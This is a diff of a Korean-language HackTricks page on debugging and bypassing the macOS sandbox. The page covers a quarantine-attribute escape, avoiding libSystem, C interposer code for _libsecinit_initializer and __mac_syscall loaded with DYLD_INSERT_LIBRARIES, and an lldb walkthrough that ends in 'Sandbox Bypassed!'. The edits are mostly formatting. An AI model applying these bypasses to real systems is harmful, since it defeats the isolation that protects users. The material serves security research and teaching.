@@ -1,4 +1,4 @@
-# macOS 샌드박스 디버그 및 우회
+# macOS Sandbox Debug & Bypass
 
 <details>
 
@@ -9,7 +9,7 @@ HackTricks를 지원하는 다른 방법:
 * 회사를 **HackTricks에서 광고**하거나 **PDF로 HackTricks를 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
+* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를** **팔로우**하세요.
 * **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
 
 </details>
@@ -22,19 +22,19 @@ HackTricks를 지원하는 다른 방법:
 
 컴파일러는 `/usr/lib/libSystem.B.dylib`를 이진 파일에 링크합니다.
 
-그런 다음 **`libSystem.B`**은 **`xpc_pipe_routine`**이 앱의 권한을 **`securityd`**에게 보내기까지 여러 함수를 호출합니다. Securityd는 프로세스가 샌드박스 내에서 격리되어야 하는지 확인하고, 그렇다면 격리됩니다.\
-마지막으로, 샌드박스는 **`__sandbox_ms`**를 호출하여 **`__mac_syscall`**을 호출합니다.
+그런 다음 \*\*`libSystem.B`\*\*은 \*\*`xpc_pipe_routine`\*\*이 앱의 권한을 \*\*`securityd`\*\*에게 보내기까지 여러 함수를 호출합니다. Securityd는 프로세스가 샌드박스 내에서 격리되어야 하는지 확인하고, 그렇다면 격리됩니다.\
+마지막으로, 샌드박스는 \*\*`__sandbox_ms`\*\*를 호출하여 \*\*`__mac_syscall`\*\*을 호출합니다.
 
 ## 우회 가능성
 
 ### 격리 속성 우회
 
-샌드박스 프로세스가 생성하는 파일은 샌드박스 탈출을 방지하기 위해 **격리 속성**이 추가됩니다. 그러나 샌드박스된 애플리케이션 내에서 **격리 속성이 없는 `.app` 폴더**를 만들 수 있다면, 앱 번들 이진 파일을 **`/bin/bash`**로 지정하고 **plist**에 일부 환경 변수를 추가하여 **`open`**을 남용하여 **새로운 앱을 샌드박스에서 벗어나게** 할 수 있습니다.
+샌드박스 프로세스가 생성하는 파일은 샌드박스 탈출을 방지하기 위해 **격리 속성**이 추가됩니다. 그러나 샌드박스된 애플리케이션 내에서 **격리 속성이 없는 `.app` 폴더**를 만들 수 있다면, 앱 번들 이진 파일을 \*\*`/bin/bash`\*\*로 지정하고 **plist**에 일부 환경 변수를 추가하여 \*\*`open`\*\*을 남용하여 **새로운 앱을 샌드박스에서 벗어나게** 할 수 있습니다.
 
 이것은 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)에서 수행된 작업입니다.
 
 {% hint style="danger" %}
-따라서 현재 당장은 **격리 속성이 없는 `.app` 폴더**를 생성할 수 있다면, macOS는 **격리 속성**을 **`.app` 폴더**와 **주 실행 파일**에서만 확인하기 때문에 샌드박스를 탈출할 수 있습니다. (주 실행 파일을 **`/bin/bash`**로 지정할 것입니다).
+따라서 현재 당장은 **격리 속성이 없는 `.app` 폴더**를 생성할 수 있다면, macOS는 **격리 속성**을 **`.app` 폴더**와 **주 실행 파일**에서만 확인하기 때문에 샌드박스를 탈출할 수 있습니다. (주 실행 파일을 \*\*`/bin/bash`\*\*로 지정할 것입니다).
 
 이미 실행이 허가된 .app 번들이 있다면 (허가된 실행 플래그가 있는 격리 xttr이 있는 경우), 이를 남용할 수도 있습니다. 그러나 이제 샌드박스 높은 내부에서는 **`.app`** 번들에 쓸 수 없습니다(특권 있는 TCC 권한이 없는 한).
 {% endhint %}
@@ -77,18 +77,21 @@ HackTricks를 지원하는 다른 방법:
 [**이 연구**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)에서는 샌드박스를 우회하는 두 가지 방법을 발견했습니다. 샌드박스는 **libSystem** 라이브러리가 로드될 때 사용자 공간에서 적용됩니다. 이진 파일이 해당 라이브러리를 로드하지 않도록 피할 수 있다면 샌드박스가 적용되지 않을 것입니다:
 
 * 이진 파일이 **완전히 정적으로 컴파일**되면 해당 라이브러리를 로드하지 않을 수 있습니다.
-* **이진 파일이 라이브러리를 로드하지 않아도 되는 경우** (링커도 libSystem에 있기 때문에), libSystem을 로드할 필요가 없습니다.&#x20;
+* **이진 파일이 라이브러리를 로드하지 않아도 되는 경우** (링커도 libSystem에 있기 때문에), libSystem을 로드할 필요가 없습니다.
 
 ### 쉘코드
 
 ARM64에서도 **쉘코드**는 `libSystem.dylib`에 링크되어야 합니다.
+
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+
 ### 권한
 
 애플리케이션이 특정 권한을 가지고 있다면, 샌드박스에서 허용되는 동작이더라도 해당 권한에 따라 특정 동작이 허용될 수 있습니다. 예를 들어:
+
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -98,15 +101,17 @@ ld: dynamic executables or dylibs must link with libSystem.dylib for architectur
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
+
 ### Interposting Bypass
 
 **Interposting**에 대한 자세한 정보는 다음을 참조하십시오:
 
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
 #### `_libsecinit_initializer`를 Interpost하여 샌드박스 방지하기
+
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -130,6 +135,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
+
 #### 샌드박스를 우회하기 위해 `__mac_syscall`을 Interpose합니다.
 
 {% code title="interpose.c" %}
@@ -165,6 +171,7 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -176,18 +183,21 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+
 ### lldb를 사용하여 Sandbox 디버그 및 우회하기
 
 Sandbox가 적용되어야 하는 응용 프로그램을 컴파일해 봅시다:
 
 {% tabs %}
-{% tab title="sand.c" %}
+{% tab title="undefined" %}
 ```c
 #include <stdlib.h>
 int main() {
 system("cat ~/Desktop/del.txt");
 }
 ```
+{% endtab %}
+
 {% tab title="entitlements.xml" %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -197,7 +207,6 @@ system("cat ~/Desktop/del.txt");
 </dict>
 </plist>
 ```
-{% tab title="Info.plist" %}
 
 Info.plist 파일에는 앱의 정보와 설정이 포함되어 있습니다. 이 파일은 macOS 앱의 기본 설정 파일로 사용됩니다. 앱의 이름, 버전, 아이콘, 권한 등의 정보를 포함하고 있습니다. Info.plist 파일은 앱 번들의 최상위 디렉토리에 위치하며, 앱이 실행될 때 macOS가 이 파일을 읽어 앱을 구성합니다.
 
@@ -207,7 +216,6 @@ Info.plist 파일은 XML 형식으로 작성되며, 키-값 쌍으로 구성됩�
 
 Info.plist 파일을 수정하여 Sandbox 환경을 우회하거나 해제하는 것은 보안 취약점을 악용하는 행위입니다. 이는 macOS 보안 기능을 우회하는 것으로 간주되며, 불법적인 목적으로 사용해서는 안 됩니다.
 
-{% endtab %}
 ```xml
 <plist version="1.0">
 <dict>
@@ -238,12 +246,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% hint style="danger" %}
 앱은 **`~/Desktop/del.txt`** 파일을 **읽으려고 시도**할 것이며, **샌드박스가 허용하지 않습니다**.\
 샌드박스를 우회하면 읽을 수 있도록 해당 위치에 파일을 생성하세요:
+
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
 애플리케이션을 디버그하여 샌드박스가 언제 로드되는지 확인해 봅시다:
+
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -320,6 +330,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
+
 {% hint style="warning" %}
 **샌드박스 우회된 경우에도 TCC**는 사용자에게 프로세스가 데스크탑에서 파일을 읽을 것인지 허용할지 물어봅니다.
 {% endhint %}
@@ -339,7 +350,7 @@ HackTricks를 지원하는 다른 방법:
 * **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
+* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를** **팔로우**하세요.
 * **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
 
 </details>
